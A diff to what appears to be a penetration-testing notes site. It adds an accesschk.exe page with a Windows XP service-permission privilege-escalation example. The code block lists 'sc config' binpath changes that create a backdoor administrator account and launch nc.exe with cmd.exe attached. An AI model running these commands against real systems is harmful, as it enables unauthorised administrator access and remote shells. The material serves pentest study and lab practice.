@@ -9,6 +9,53 @@ hideFooterPagination: true
 
 {/* Generated from Commands/accesschk.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## accesschk.exe: choose the operation and read the result
+
+Commands and examples collected from your accesschk.exe notes.
+
+### What the result establishes
+
+Tie reported rights to the exact user/group and object type being checked.
+
+### Prerequisites and common failures
+
+Service-configuration access, executable write access and directory write access are distinct conditions; examine each part of a proposed path.
+
+### Example 1: Example with Windows XP SP1 - upnphost
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```powershell
+$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS
+
+$ accesschk.exe -ucqv upnphost
+upnphost
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+
+$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
+$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+$ sc stop <vuln-service>
+$ sc start <vuln-service>
+$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
+$ sc stop <vuln-service>
+$ sc start <vuln-service>
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your accesschk.exe notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=accesschk) · [All tools](/index)
 
 ## Example with Windows XP SP1 - upnphost
@@ -42,6 +89,21 @@ $ sc stop <vuln-service>
 $ sc start <vuln-service>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Example with Windows XP SP1 - upnphost](/privesc/windows-privesc-checklist#example-with-windows-xp-sp1-upnphost)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 Saved as written; may include lab values or terminal output.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+
+{/* VAULT_RELATED_END */}
